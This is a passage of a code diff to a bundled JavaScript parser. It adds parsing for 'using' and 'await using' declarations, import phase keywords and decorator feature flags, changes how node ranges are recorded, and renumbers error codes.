+          features |= nextFeatures;
         }
-        if (options.globalReturn && (!options.sourceType || options.sourceType === "script")) {
-          options.sourceType = "commonjs";
+        ranges = normalizeRanges(ranges);
+        if (module2 && !sourceType) {
+          sourceType = "module";
         }
+        if (globalReturn && (!sourceType || sourceType === "script")) {
+          sourceType = "commonjs";
+        }
+        const options = {
+          ...restOptions,
+          ranges,
+          features,
+          sourceType
+        };
         return options;
       }
       var PrivateScope = class {
@@ -4615,7 +4669,7 @@ var retirechrome = (() => {
             focusKind |= 768;
           const value = privateIdentifiers.get(name);
           if (this.hasPrivateIdentifier(name) && ((value & 32) !== (focusKind & 32) || value & focusKind & 768)) {
-            this.parser.report(146, name);
+            this.parser.report(148, name);
           }
           privateIdentifiers.set(name, this.hasPrivateIdentifier(name) ? value | focusKind : focusKind);
         }
@@ -4671,16 +4725,16 @@ var retirechrome = (() => {
             if (value && value & 248) {
               if (parser.options.webcompat && (context & 1) === 0 && (kind & 128 && value & 68 || value & 128 && kind & 68)) ;
               else {
-                parser.report(145, name);
+                parser.report(147, name);
               }
             }
             if (currentScope === this) {
               if (value && value & 1 && kind & 1) {
-                currentScope.recordScopeError(145, name);
+                currentScope.recordScopeError(147, name);
               }
             }
             if (value && (value & 256 || value & 512 && !parser.options.webcompat)) {
-              parser.report(145, name);
+              parser.report(147, name);
             }
             currentScope.variableBindings.set(name, kind);
             currentScope = currentScope.parent;
@@ -4694,23 +4748,23 @@ var retirechrome = (() => {
           const value = this.variableBindings.get(name);
           if (value && (value & 2) === 0) {
             if (kind & 1) {
-              this.recordScopeError(145, name);
+              this.recordScopeError(147, name);
             } else if (parser.options.webcompat && (context & 1) === 0 && origin & 2 && value === 64 && kind === 64) ;
             else {
-              parser.report(145, name);
+              parser.report(147, name);
             }
           }
           if (this.type & 64 && this.parent?.hasVariable(name) && (this.parent.variableBindings.get(name) & 2) === 0) {
-            parser.report(145, name);
+            parser.report(147, name);
           }
           if (this.type & 512 && value && (value & 2) === 0) {
             if (kind & 1) {
-              this.recordScopeError(145, name);
+              this.recordScopeError(147, name);
             }
           }
           if (this.type & 32) {
             if (this.parent.variableBindings.get(name) & 768)
-              parser.report(159, name);
+              parser.report(161, name);
           }
           this.variableBindings.set(name, kind);
         }
@@ -4741,6 +4795,7 @@ var retirechrome = (() => {
         options;
         token = 1048576;
         flags = 0;
+        features = 0;
         index = 0;
         line = 1;
         column = 0;
@@ -4759,12 +4814,14 @@ var retirechrome = (() => {
         exportedBindings = /* @__PURE__ */ new Set();
         assignable = 0;
         destructible = 0;
+        strictReservedRange = null;
         leadingDecorators = { decorators: [] };
         constructor(source, rawOptions = {}) {
           this.source = source;
           this.end = source.length;
           this.currentChar = source.charCodeAt(0);
           this.options = normalizeOptions(rawOptions);
+          this.features = this.options.features;
           if (Array.isArray(this.options.onComment)) {
             this.options.onComment = pushComment(this.options.onComment, this.options);
           }
@@ -4814,11 +4871,15 @@ var retirechrome = (() => {
           return { index: this.index, line: this.line, column: this.column };
         }
         finishNode(node, start, end) {
-          if (this.options.ranges) {
-            node.start = start.index;
+          const { ranges } = this.options;
+          if (ranges) {
             const endIndex = end ? end.index : this.startIndex;
-            node.end = endIndex;
-            node.range = [start.index, endIndex];
+            if (ranges.start)
+              node.start = start.index;
+            if (ranges.end)
+              node.end = endIndex;
+            if (ranges.range)
+              node.range = [start.index, endIndex];
           }
           if (this.options.loc) {
             node.loc = {
@@ -4840,7 +4901,7 @@ var retirechrome = (() => {
         declareUnboundVariable(name) {
           const { exportedNames } = this;
           if (exportedNames.has(name)) {
-            this.report(147, name);
+            this.report(149, name);
           }
           exportedNames.add(name);
         }
@@ -4863,23 +4924,10 @@ var retirechrome = (() => {
           return void 0;
         }
         cloneIdentifier(original) {
-          return this.cloneLocationInformation({ ...original }, original);
+          return structuredClone(original);
         }
         cloneStringLiteral(original) {
-          return this.cloneLocationInformation({ ...original }, original);
-        }
-        cloneLocationInformation(node, original) {
-          if (this.options.ranges) {
-            node.range = [...original.range];
-          }
-          if (this.options.loc) {
-            node.loc = {
-              ...original.loc,
-              start: { ...original.loc.start },
-              end: { ...original.loc.end }
-            };
-          }
-          return node;
+          return structuredClone(original);
         }
       };
       function pushComment(comments, options) {
@@ -4888,10 +4936,14 @@ var retirechrome = (() => {
             type,
             value
           };
-          if (options.ranges) {
-            comment.start = start;
-            comment.end = end;
-            comment.range = [start, end];
+          const { ranges } = options;
+          if (ranges) {
+            if (ranges.start)
+              comment.start = start;
+            if (ranges.end)
+              comment.end = end;
+            if (ranges.range)
+              comment.range = [start, end];
           }
           if (options.loc) {
             comment.loc = loc;
@@ -4904,10 +4956,14 @@ var retirechrome = (() => {
           const token = {
             token: type
           };
-          if (options.ranges) {
-            token.start = start;
-            token.end = end;
-            token.range = [start, end];
+          const { ranges } = options;
+          if (ranges) {
+            if (ranges.start)
+              token.start = start;
+            if (ranges.end)
+              token.end = end;
+            if (ranges.range)
+              token.range = [start, end];
           }
           if (options.loc) {
             token.loc = loc;
@@ -4925,7 +4981,7 @@ var retirechrome = (() => {
           context |= 1;
         skipHashBang(parser);
         const scope = parser.createScopeIfLexical();
-        let body = [];
+        let body;
         let sourceType = "script";
         if (context & 2) {
           sourceType = "module";
@@ -4933,7 +4989,7 @@ var retirechrome = (() => {
           if (scope) {
             for (const name of parser.exportedBindings) {
               if (!scope.hasVariable(name))
-                parser.report(148, name);
+                parser.report(150, name);
             }
           }
         } else {
@@ -4982,7 +5038,7 @@ var retirechrome = (() => {
         return statements;
       }
       function parseModuleItem(parser, context, scope) {
-        if (parser.getToken() === 132) {
+        if (parser.getToken() === 133) {
           Object.assign(parser.leadingDecorators, {
             start: parser.tokenStart,
             decorators: parseDecorators(parser, context, void 0)
@@ -4994,28 +5050,41 @@ var retirechrome = (() => {
             moduleItem = parseExportDeclaration(parser, context, scope);
             break;
           case 86106:
+            if (parser.leadingDecorators.decorators.length) {
+              parser.report(172);
+            }
             moduleItem = parseImportDeclaration(parser, context, scope);
             break;
           default:
             moduleItem = parseStatementListItem(parser, context, scope, void 0, 4, {});
         }
-        if (parser.leadingDecorators?.decorators.length) {
-          parser.report(170);
-        }
         return moduleItem;
       }
       function parseStatementListItem(parser, context, scope, privateScope, origin, labels) {
         const start = parser.tokenStart;
+        if (parser.leadingDecorators.decorators.length && parser.getToken() !== 86094) {
+          parser.report(172);
+        }
         switch (parser.getToken()) {
           case 86104:
             return parseFunctionDeclaration(parser, context, scope, privateScope, origin, 1, 0, 0, start);
-          case 132:
+          case 133:
+            if (!(parser.features & 1)) {
+              parser.report(30, "@");
+            }
           case 86094:
             return parseClassDeclaration(parser, context, scope, privateScope, 0);
           case 86090:
             return parseLexicalDeclaration(parser, context, scope, privateScope, 16, 0);
           case 241737:
             return parseLetIdentOrVarDeclarationStatement(parser, context, scope, privateScope, origin);
+          case 209013:
+            return parseUsingDeclarationOrExpressionStatement(parser, context, scope, privateScope, origin, labels);
+          case 209006:
+            if ((context & 2048 || context & 2 && context & 8) && nextTokenIsUsingOnSameLine(parser)) {
+              return parseAwaitUsingDeclarationOrExpressionStatement(parser, context, scope, privateScope, origin, labels);
+            }
+            return parseStatement(parser, context, scope, privateScope, origin, labels, 1);
           case 20564:
             parser.report(103, "export");
           case 86106:
@@ -5069,9 +5138,9 @@ var retirechrome = (() => {
           case 209005:
             return parseAsyncArrowOrAsyncFunctionDeclaration(parser, context, scope, privateScope, origin, labels, 0);
           case 20557:
-            parser.report(162);
+            parser.report(164);
           case 20566:
-            parser.report(163);
+            parser.report(165);
           case 86104:
             parser.report(context & 1 ? 76 : !parser.options.webcompat ? 78 : 77);
           case 86094:
@@ -5095,15 +5164,18 @@ var retirechrome = (() => {
           default:
             expr = parsePrimaryExpression(parser, context, privateScope, 2, 0, 1, 0, 1, parser.tokenStart);
         }
+        return finishExpressionOrLabelledStatement(parser, context, scope, privateScope, origin, labels, allowFuncDecl, expr, token, tokenValue, tokenStart);
+      }
+      function finishExpressionOrLabelledStatement(parser, context, scope, privateScope, origin, labels, allowFuncDecl, initialExpression, token, tokenValue, tokenStart) {
         if (token & 143360 && parser.getToken() === 21) {
-          return parseLabelledStatement(parser, context, scope, privateScope, origin, labels, tokenValue, expr, token, allowFuncDecl, tokenStart);
+          return parseLabelledStatement(parser, context, scope, privateScope, origin, labels, tokenValue, initialExpression, token, allowFuncDecl, tokenStart);
         }
-        expr = parseMemberOrUpdateExpression(parser, context, privateScope, expr, 0, 0, tokenStart);
-        expr = parseAssignmentExpression(parser, context, privateScope, 0, 0, tokenStart, expr);
+        let expression = parseMemberOrUpdateExpression(parser, context, privateScope, initialExpression, 0, 0, tokenStart);
+        expression = parseAssignmentExpression(parser, context, privateScope, 0, 0, tokenStart, expression);
         if (parser.getToken() === 18) {
-          expr = parseSequenceExpression(parser, context, privateScope, 0, tokenStart, expr);
+          expression = parseSequenceExpression(parser, context, privateScope, 0, tokenStart, expression);
         }
-        return parseExpressionStatement(parser, context, expr, tokenStart);
+        return parseExpressionStatement(parser, context, expression, tokenStart);
       }
       function parseBlock(parser, context, scope, privateScope, labels, start = parser.tokenStart, type = "BlockStatement") {
         const body = [];
@@ -5158,7 +5230,7 @@ var retirechrome = (() => {
         if (!asyncNewLine) {
           if (parser.getToken() === 86104) {
             if (!allowFuncDecl)
-              parser.report(123);
+              parser.report(125);
             return parseFunctionDeclaration(parser, context, scope, privateScope, origin, 1, 0, 1, start);
           }
           if (isValidIdentifier(context, parser.getToken())) {
@@ -5277,9 +5349,13 @@ var retirechrome = (() => {
           }
           consume(parser, context | 32, 21);
           while (parser.getToken() !== 20556 && parser.getToken() !== 1074790415 && parser.getToken() !== 20561) {
-            consequent.push(parseStatementListItem(parser, context | 4, scope, privateScope, 2, {
+            const statement = parseStatementListItem(parser, context | 4, scope, privateScope, 2, {
               $: labels
-            }));
+            });
+            if (statement.type === "VariableDeclaration" && (statement.kind === "using" || statement.kind === "await using")) {
+              parser.report(30, statement.kind);
+            }
+            consequent.push(statement);
           }
           cases.push(parser.finishNode({
             type: "SwitchCase",
@@ -5320,7 +5396,7 @@ var retirechrome = (() => {
           const { tokenValue } = parser;
           label = parseIdentifier(parser, context | 32);
           if (!isValidLabel(parser, labels, tokenValue, 1))
-            parser.report(138, tokenValue);
+            parser.report(140, tokenValue);
         }
         matchOrInsertSemicolon(parser, context | 32);
         return parser.finishNode({
@@ -5336,7 +5412,7 @@ var retirechrome = (() => {
           const { tokenValue } = parser;
           label = parseIdentifier(parser, context | 32);
           if (!isValidLabel(parser, labels, tokenValue, 0))
-            parser.report(138, tokenValue);
+            parser.report(140, tokenValue);
         } else if ((context & (4 | 128)) === 0) {
           parser.report(69);
         }
@@ -5395,7 +5471,6 @@ var retirechrome = (() => {
       }
       function parseCatchBlock(parser, context, scope, privateScope, labels, start) {
         let param = null;
-        let additionalScope = scope;
         if (consumeOpt(parser, context, 67174411)) {
           scope = scope?.createChildScope(4);
           param = parseBindingPattern(parser, context, scope, privateScope, (parser.getToken() & 2097152) === 2097152 ? 256 : 512, 0);
@@ -5406,7 +5481,7 @@ var retirechrome = (() => {
           }
           consume(parser, context | 32, 16);
         }
-        additionalScope = scope?.createChildScope(32);
+        const additionalScope = scope?.createChildScope(32);
         const body = parseBlock(parser, context, additionalScope, privateScope, { $: labels });
         return parser.finishNode({
           type: "CatchClause",
@@ -5439,7 +5514,7 @@ var retirechrome = (() => {
         const { tokenValue, tokenStart } = parser;
         const token = parser.getToken();
         let expr = parseIdentifier(parser, context);
-        if (parser.getToken() & (143360 | 2097152)) {
+        if (parser.getToken() & (143360 | 2097152) && (parser.getToken() & 20480) !== 20480) {
           const declarations = parseVariableDeclarationList(parser, context, scope, privateScope, 8, 0);
           matchOrInsertSemicolon(parser, context | 32);
           return parser.finishNode({
@@ -5469,14 +5544,89 @@ var retirechrome = (() => {
         }
         return parseExpressionStatement(parser, context, expr, tokenStart);
       }
-      function parseLexicalDeclaration(parser, context, scope, privateScope, kind, origin) {
+      function nextTokenIsUsingOnSameLine(parser) {
+        const { index: parserIndex, source } = parser;
+        let index = parserIndex;
+        while (index < parser.end) {
+          const char = source.charCodeAt(index);
+          if (char === 10 || char === 13 || char === 8232 || char === 8233)
+            return false;
+          if (/\s/u.test(source[index])) {
+            index++;
+            continue;
+          }
+          if (char === 47 && source.charCodeAt(index + 1) === 42) {
+            index += 2;
+            while (index < parser.end) {
+              const commentChar = source.charCodeAt(index);
+              if (commentChar === 10 || commentChar === 13 || commentChar === 8232 || commentChar === 8233) {
+                return false;
+              }
+              if (commentChar === 42 && source.charCodeAt(index + 1) === 47) {
+                index += 2;
+                break;
+              }
+              index++;
+            }
+            continue;
+          }
+          break;
+        }
+        if (source.slice(index, index + 5) !== "using")
+          return false;
+        const following = source.codePointAt(index + 5);
+        return following === void 0 || following !== 92 && !isIdentifierPart(following);
+      }
+      function isResourceBindingStart(token) {
+        return (token & 143360) === 143360 && (token & 20480) !== 20480;
+      }
+      function parseUsingDeclarationOrExpressionStatement(parser, context, scope, privateScope, origin, labels) {
+        const { tokenStart, tokenValue } = parser;
+        const token = parser.getToken();
+        const expression = parseIdentifier(parser, context);
+        if ((parser.flags & 1) === 0 && isResourceBindingStart(parser.getToken())) {
+          if (origin & 4 && context & 8 && (context & 2) === 0) {
+            parser.report(30, KeywordDescTable[parser.getToken() & 255]);
+          }
+          return parseLexicalDeclaration(parser, context, scope, privateScope, 16, origin, "using", tokenStart, 1);
+        }
+        parser.assignable = 1;
+        return finishExpressionOrLabelledStatement(parser, context, scope, privateScope, origin, labels, 1, expression, token, tokenValue, tokenStart);
+      }
+      function parseAwaitUsingDeclarationOrExpressionStatement(parser, context, scope, privateScope, origin, labels) {
         const start = parser.tokenStart;
-        nextToken(parser, context);
-        const declarations = parseVariableDeclarationList(parser, context, scope, privateScope, kind, origin);
+        if (context & 524288)
+          parser.report(179);
+        nextToken(parser, context | 32);
+        let argument;
+        if ((parser.flags & 1) === 0 && parser.getToken() === 209013) {
+          const usingStart = parser.tokenStart;
+          const usingIdentifier = parseIdentifier(parser, context);
+          if ((parser.flags & 1) === 0 && isResourceBindingStart(parser.getToken())) {
+            return parseLexicalDeclaration(parser, context, scope, privateScope, 16, origin, "await using", start, 1);
+          }
+          argument = parseMemberOrUpdateExpression(parser, context, privateScope, usingIdentifier, 0, 0, usingStart);
+        } else {
+          argument = parseLeftHandSideExpression(parser, context, privateScope, 0, 0, 1);
+        }
+        if (parser.getToken() === 8391735)
+          parser.report(33);
+        parser.assignable = 2;
+        const expression = parser.finishNode({
+          type: "AwaitExpression",
+          argument
+        }, start);
+        return finishExpressionOrLabelledStatement(parser, context, scope, privateScope, origin, labels, 0, expression, 1048576, "", start);
+      }
+      function parseLexicalDeclaration(parser, context, scope, privateScope, kind, origin, declarationKind, declarationStart = parser.tokenStart, keywordConsumed = 0) {
+        const start = declarationStart;
+        if (!keywordConsumed)
+          nextToken(parser, context);
+        const declarations = parseVariableDeclarationList(parser, context, scope, privateScope, kind, origin, declarationKind);
         matchOrInsertSemicolon(parser, context | 32);
         return parser.finishNode({
           type: "VariableDeclaration",
-          kind: kind & 8 ? "let" : "const",
+          kind: declarationKind ?? (kind & 8 ? "let" : "const"),
           declarations
         }, start);
       }
@@ -5491,35 +5641,45 @@ var retirechrome = (() => {
           declarations
         }, start);
       }
-      function parseVariableDeclarationList(parser, context, scope, privateScope, kind, origin) {
+      function parseVariableDeclarationList(parser, context, scope, privateScope, kind, origin, declarationKind) {
         let bindingCount = 1;
-        const list = [
-          parseVariableDeclaration(parser, context, scope, privateScope, kind, origin)
-        ];
+        const firstDeclaration = parseVariableDeclaration(parser, context, scope, privateScope, kind, origin, declarationKind);
+        const list = [firstDeclaration];
+        const resourceNames = declarationKind && parser.options.lexical ? /* @__PURE__ */ new Set([firstDeclaration.id.name]) : void 0;
         while (consumeOpt(parser, context, 18)) {
           bindingCount++;
-          list.push(parseVariableDeclaration(parser, context, scope, privateScope, kind, origin));
+          const declaration = parseVariableDeclaration(parser, context, scope, privateScope, kind, origin, declarationKind);
+          if (resourceNames) {
+            const { name } = declaration.id;
+            if (resourceNames.has(name))
+              parser.report(147, name);
+            resourceNames.add(name);
+          }
+          list.push(declaration);
         }
         if (bindingCount > 1 && origin & 32 && parser.getToken() & 262144) {
           parser.report(61, KeywordDescTable[parser.getToken() & 255]);
         }
         return list;
       }
-      function parseVariableDeclaration(parser, context, scope, privateScope, kind, origin) {
+      function parseVariableDeclaration(parser, context, scope, privateScope, kind, origin, declarationKind) {
         const { tokenStart } = parser;
         const token = parser.getToken();
         let init = null;
+        if (declarationKind && (token & 2097152) === 2097152) {
+          parser.report(50);
+        }
         const id = parseBindingPattern(parser, context, scope, privateScope, kind, origin);
         if (parser.getToken() === 1077936155) {
           nextToken(parser, context | 32);
           init = parseExpression(parser, context, privateScope, 1, 0, parser.tokenStart);
-          if (origin & 32 || (token & 2097152) === 0) {
+          if (origin & 32) {
             if (parser.getToken() === 471156 || parser.getToken() === 8673330 && (token & 2097152 || (kind & 4) === 0 || context & 1)) {
               throw new ParseError(tokenStart, parser.currentLocation, 60, parser.getToken() === 471156 ? "of" : "in");
             }
           }
         } else if ((kind & 16 || (token & 2097152) > 0) && (parser.getToken() & 262144) !== 262144) {
-          parser.report(59, kind & 16 ? "const" : "destructuring");
+          parser.report(59, declarationKind ?? (kind & 16 ? "const" : "destructuring"));
         }
         return parser.finishNode({
           type: "VariableDeclarator",
@@ -5537,24 +5697,21 @@ var retirechrome = (() => {
         let update = null;
         let destructible = 0;
         let init = null;
-        let isVarDecl = parser.getToken() === 86088 || parser.getToken() === 241737 || parser.getToken() === 86090;
+        let isVarDecl = parser.getToken() === 86088 || parser.getToken() === 241737 || parser.getToken() === 86090 || parser.getToken() === 209013;
+        let resourceDeclarationKind;
+        let consumedForOfDelimiter = false;
         let right;
         const { tokenStart } = parser;
         const token = parser.getToken();
         if (isVarDecl) {
           if (token === 241737) {
             init = parseIdentifier(parser, context);
-            if (parser.getToken() & (143360 | 2097152)) {
-              if (parser.getToken() === 8673330) {
-                if (context & 1)
-                  parser.report(67);
-              } else {
-                init = parser.finishNode({
-                  type: "VariableDeclaration",
-                  kind: "let",
-                  declarations: parseVariableDeclarationList(parser, context | 131072, scope, privateScope, 8, 32)
-                }, tokenStart);
-              }
+            if (parser.getToken() & (143360 | 2097152) && (parser.getToken() & 20480) !== 20480) {
+              init = parser.finishNode({
+                type: "VariableDeclaration",
+                kind: "let",
+                declarations: parseVariableDeclarationList(parser, context | 131072, scope, privateScope, 8, 32)
+              }, tokenStart);
               parser.assignable = 1;
             } else if (context & 1) {
               parser.report(67);
@@ -5563,7 +5720,74 @@ var retirechrome = (() => {
               parser.assignable = 1;
               init = parseMemberOrUpdateExpression(parser, context, privateScope, init, 0, 0, tokenStart);
               if (parser.getToken() === 471156)
-                parser.report(115);
+                parser.report(117);
+            }
+          } else if (token === 209013) {
+            const usingIdentifier = parseIdentifier(parser, context);
+            if ((parser.flags & 1) !== 0 || !isResourceBindingStart(parser.getToken())) {
+              isVarDecl = false;
+              parser.assignable = 1;
+              init = parseMemberOrUpdateExpression(parser, context, privateScope, usingIdentifier, 0, 0, tokenStart);
+            } else if (parser.getToken() === 471156) {
+              const ofStart = parser.tokenStart;
+              const ofToken = parser.getToken();
+              const ofValue = parser.tokenValue;
+              const ofIdentifier = parseIdentifier(parser, context);
+              if (parser.getToken() !== 1077936155 && parser.getToken() !== 8673330 && parser.getToken() !== 1074790417 && parser.getToken() !== 18) {
+                isVarDecl = false;
+                consumedForOfDelimiter = true;
+                parser.assignable = 1;
+                init = usingIdentifier;
+              } else {
+                resourceDeclarationKind = "using";
+                validateBindingIdentifier(parser, context, 16, ofToken, 0);
+                scope?.addBlockName(context, ofValue, 16, 32);
+                let declarationInitializer = null;
+                if (parser.getToken() === 1077936155) {
+                  nextToken(parser, context | 32);
+                  declarationInitializer = parseExpression(parser, context | 131072, privateScope, 1, 0, parser.tokenStart);
+                  if ((parser.getToken() & 262144) === 262144) {
+                    throw new ParseError(ofStart, parser.currentLocation, 60, parser.getToken() === 471156 ? "of" : "in");
+                  }
+                } else if (parser.getToken() !== 8673330) {
+                  parser.report(59, resourceDeclarationKind);
+                }
+                const declarations = [
+                  parser.finishNode({
+                    type: "VariableDeclarator",
+                    id: ofIdentifier,
+                    init: declarationInitializer
+                  }, ofStart)
+                ];
+                const resourceNames = parser.options.lexical ? /* @__PURE__ */ new Set([ofValue]) : void 0;
+                while (consumeOpt(parser, context | 131072, 18)) {
+                  const declaration = parseVariableDeclaration(parser, context | 131072, scope, privateScope, 16, 32, resourceDeclarationKind);
+                  if (resourceNames) {
+                    const { name } = declaration.id;
+                    if (resourceNames.has(name))
+                      parser.report(147, name);
+                    resourceNames.add(name);
+                  }
+                  declarations.push(declaration);
+                }
+                if (declarations.length > 1 && parser.getToken() & 262144) {
+                  parser.report(61, KeywordDescTable[parser.getToken() & 255]);
+                }
+                init = parser.finishNode({
+                  type: "VariableDeclaration",
+                  kind: resourceDeclarationKind,
+                  declarations
+                }, tokenStart);
+                parser.assignable = 1;
+              }
+            } else {
+              resourceDeclarationKind = "using";
+              init = parser.finishNode({
+                type: "VariableDeclaration",
+                kind: resourceDeclarationKind,
+                declarations: parseVariableDeclarationList(parser, context | 131072, scope, privateScope, 16, 32, resourceDeclarationKind)
+              }, tokenStart);
+              parser.assignable = 1;
             }
           } else {
             nextToken(parser, context);
@@ -5577,6 +5801,38 @@ var retirechrome = (() => {
               declarations: parseVariableDeclarationList(parser, context | 131072, scope, privateScope, 16, 32)
             }, tokenStart);
             parser.assignable = 1;
+          }
+        } else if (token === 209006 && (context & 2048 || context & 2 && context & 8)) {
+          if (context & 524288)
+            parser.report(179);
+          nextToken(parser, context | 32);
+          let awaitArgument;
+          if ((parser.flags & 1) === 0 && parser.getToken() === 209013) {
+            const usingStart = parser.tokenStart;
+            const usingIdentifier = parseIdentifier(parser, context);
+            if ((parser.flags & 1) === 0 && isResourceBindingStart(parser.getToken())) {
+              resourceDeclarationKind = "await using";
+              isVarDecl = true;
+              init = parser.finishNode({
+                type: "VariableDeclaration",
+                kind: resourceDeclarationKind,
+                declarations: parseVariableDeclarationList(parser, context | 131072, scope, privateScope, 16, 32, resourceDeclarationKind)
+              }, tokenStart);
+              parser.assignable = 1;
+            } else {
+              awaitArgument = parseMemberOrUpdateExpression(parser, context, privateScope, usingIdentifier, 0, 0, usingStart);
+            }
+          } else {
+            awaitArgument = parseLeftHandSideExpression(parser, context, privateScope, 0, 0, 1);
+          }
+          if (!isVarDecl) {
+            if (parser.getToken() === 8391735)
+              parser.report(33);
+            parser.assignable = 2;
+            init = parser.finishNode({
+              type: "AwaitExpression",
+              argument: awaitArgument
+            }, tokenStart);
           }
         } else if (token === 1074790417) {
           if (forAwait)
@@ -5593,12 +5849,13 @@ var retirechrome = (() => {
         } else {
           init = parseLeftHandSideExpression(parser, context | 131072, privateScope, 1, 0, 1);
         }
-        if ((parser.getToken() & 262144) === 262144) {
-          if (parser.getToken() === 471156) {
+        if (consumedForOfDelimiter || (parser.getToken() & 262144) === 262144) {
+          if (consumedForOfDelimiter || parser.getToken() === 471156) {
             if (parser.assignable & 2)
               parser.report(80, forAwait ? "await" : "of");
             reinterpretToPattern(parser, init);
-            nextToken(parser, context | 32);
+            if (!consumedForOfDelimiter)
+              nextToken(parser, context | 32);
             right = parseExpression(parser, context, privateScope, 1, 0, parser.tokenStart);
             consume(parser, context | 32, 16);
             const body3 = parseIterationStatementBody(parser, context, scope, privateScope, labels);
@@ -5610,6 +5867,8 @@ var retirechrome = (() => {
               await: forAwait
             }, start);
           }
+          if (resourceDeclarationKind)
+            parser.report(30, "in");
           if (parser.assignable & 2)
             parser.report(80, "in");
           reinterpretToPattern(parser, init);
@@ -5654,30 +5913,103 @@ var retirechrome = (() => {
       }
       function parseRestrictedIdentifier(parser, context, scope) {
         if (!isValidIdentifier(context, parser.getToken()))
-          parser.report(118);
+          parser.report(120);
         if ((parser.getToken() & 537079808) === 537079808)
-          parser.report(119);
+          parser.report(121);
         scope?.addBlockName(context, parser.tokenValue, 8, 0);
         return parseIdentifier(parser, context);
       }
       function parseImportDeclaration(parser, context, scope) {
         const start = parser.tokenStart;
         nextToken(parser, context);
-        let source = null;
+        let source;
+        let sourceParsed = false;
+        let phase = null;
         const { tokenStart } = parser;
         let specifiers = [];
         if (parser.getToken() === 134283267) {
           source = parseLiteral(parser, context);
         } else {
           if (parser.getToken() & 143360) {
-            const local = parseRestrictedIdentifier(parser, context, scope);
-            specifiers = [
-              parser.finishNode({
-                type: "ImportDefaultSpecifier",
-                local
-              }, tokenStart)
-            ];
-            if (consumeOpt(parser, context, 18)) {
+            const token = parser.getToken();
+            const { tokenValue } = parser;
+            const isPhaseDefer = parser.features & 2 && (token & -2147483648) === 0 && tokenValue == "defer";
+            const isPhaseSource = parser.features & 4 && (token & -2147483648) === 0 && tokenValue == "source";
+            if (isPhaseDefer || isPhaseSource) {
+              const phaseOrLocal = parseIdentifier(parser, context);
+              if (tokenValue === "defer") {
+                if (parser.getToken() === 8391476) {
+                  phase = "defer";
+                  specifiers = [parseImportNamespaceSpecifier(parser, context, scope)];
+                } else if (parser.getToken() === 209011 || parser.getToken() === 18) {
+                  scope?.addBlockName(context, tokenValue, 8, 0);
+                  specifiers = [
+                    parser.finishNode({
+                      type: "ImportDefaultSpecifier",
+                      local: phaseOrLocal
+                    }, tokenStart)
+                  ];
+                } else {
+                  parser.report(108);
+                }
+              } else if (parser.getToken() === 209011) {
+                const fromToken = parser.getToken();
+                const fromStart = parser.tokenStart;
+                const fromLocal = parseIdentifier(parser, context);
+                if (parser.getToken() === 209011) {
+                  validateBindingIdentifier(parser, context, 16, fromToken, 0);
+                  scope?.addBlockName(context, fromLocal.name, 8, 0);
+                  phase = "source";
+                  specifiers = [
+                    parser.finishNode({
+                      type: "ImportDefaultSpecifier",
+                      local: fromLocal
+                    }, fromStart)
+                  ];
+                } else {
+                  scope?.addBlockName(context, tokenValue, 8, 0);
+                  specifiers = [
+                    parser.finishNode({
+                      type: "ImportDefaultSpecifier",
+                      local: phaseOrLocal
+                    }, tokenStart)
+                  ];
+                  if (parser.getToken() !== 134283267)
+                    parser.report(105, "Import");
+                  source = parseLiteral(parser, context);
+                  sourceParsed = true;
+                }
+              } else if (parser.getToken() & 143360) {
+                phase = "source";
+                const localStart = parser.tokenStart;
+                const local = parseRestrictedIdentifier(parser, context, scope);
+                specifiers = [
+                  parser.finishNode({
+                    type: "ImportDefaultSpecifier",
+                    local
+                  }, localStart)
+                ];
+              } else if (parser.getToken() === 18) {
+                scope?.addBlockName(context, tokenValue, 8, 0);
+                specifiers = [
+                  parser.finishNode({
+                    type: "ImportDefaultSpecifier",
+                    local: phaseOrLocal
+                  }, tokenStart)
+                ];
+              } else {
+                parser.report(109);
+              }
+            } else {
+              const local = parseRestrictedIdentifier(parser, context, scope);
+              specifiers = [
+                parser.finishNode({
+                  type: "ImportDefaultSpecifier",
+                  local
+                }, tokenStart)
+              ];
+            }
+            if (phase === null && !sourceParsed && consumeOpt(parser, context, 18)) {
               switch (parser.getToken()) {
                 case 8391476:
                   specifiers.push(parseImportNamespaceSpecifier(parser, context, scope));
@@ -5705,14 +6037,16 @@ var retirechrome = (() => {
                 parser.report(30, KeywordDescTable[parser.getToken() & 255]);
             }
           }
-          source = parseModuleSpecifier(parser, context);
+          if (!sourceParsed)
+            source = parseModuleSpecifier(parser, context);
         }
         const attributes = parseImportAttributes(parser, context);
         const node = {
           type: "ImportDeclaration",
           specifiers,
           source,
-          attributes
+          attributes,
+          ...parser.features & 2 || parser.features & 4 ? { phase } : null
         };
         matchOrInsertSemicolon(parser, context | 32);
         return parser.finishNode(node, start);
@@ -5791,17 +6125,24 @@ var retirechrome = (() => {
       function parseExportDeclaration(parser, context, scope) {
         const start = parser.leadingDecorators.decorators.length ? parser.leadingDecorators.start : parser.tokenStart;
         nextToken(parser, context | 32);
+        const isDefaultExport = consumeOpt(parser, context | 32, 20561);
+        if (parser.leadingDecorators.decorators.length && parser.getToken() !== 86094) {
+          parser.report(172);
+        }
         const specifiers = [];
         let declaration = null;
         let source = null;
         let attributes = [];
-        if (consumeOpt(parser, context | 32, 20561)) {
+        if (isDefaultExport) {
           switch (parser.getToken()) {
             case 86104: {
               declaration = parseFunctionDeclaration(parser, context, scope, void 0, 4, 1, 1, 0, parser.tokenStart);
               break;
             }
-            case 132:
+            case 133:
+              if (!(parser.features & 1)) {
+                parser.report(30, "@");
+              }
             case 86094:
               declaration = parseClassDeclaration(parser, context, scope, void 0, 1);
               break;
@@ -5910,7 +6251,7 @@ var retirechrome = (() => {
               }
             } else {
               if (hasLiteralLocal) {
-                parser.report(172);
+                parser.report(174);
               }
               if (scope) {
                 tmpExportedNames.forEach((n) => parser.declareUnboundVariable(n));
@@ -5920,7 +6261,10 @@ var retirechrome = (() => {
             matchOrInsertSemicolon(parser, context | 32);
             break;
           }
-          case 132:
+          case 133:
+            if (!(parser.features & 1)) {
+              parser.report(30, "@");
+            }
           case 86094:
             declaration = parseClassDeclaration(parser, context, scope, void 0, 2);
             break;
@@ -6046,7 +6390,7 @@ var retirechrome = (() => {
           t = parser.getToken();
           precedence = t & 3840;
           if (t & 524288 && operator & 268435456 || operator & 524288 && t & 268435456) {
-            parser.report(165);
+            parser.report(167);
           }
           if (precedence + ((t === 8391735) << 8) - ((bit === t) << 12) <= minPrecedence)
             break;
@@ -6073,9 +6417,9 @@ var retirechrome = (() => {
           parser.report(33);
         if (context & 1 && unaryOperator === 16863276) {
           if (arg.type === "Identifier") {
-            parser.report(121);
+            parser.report(123);
           } else if (isPropertyWithPrivateFieldKey(arg)) {
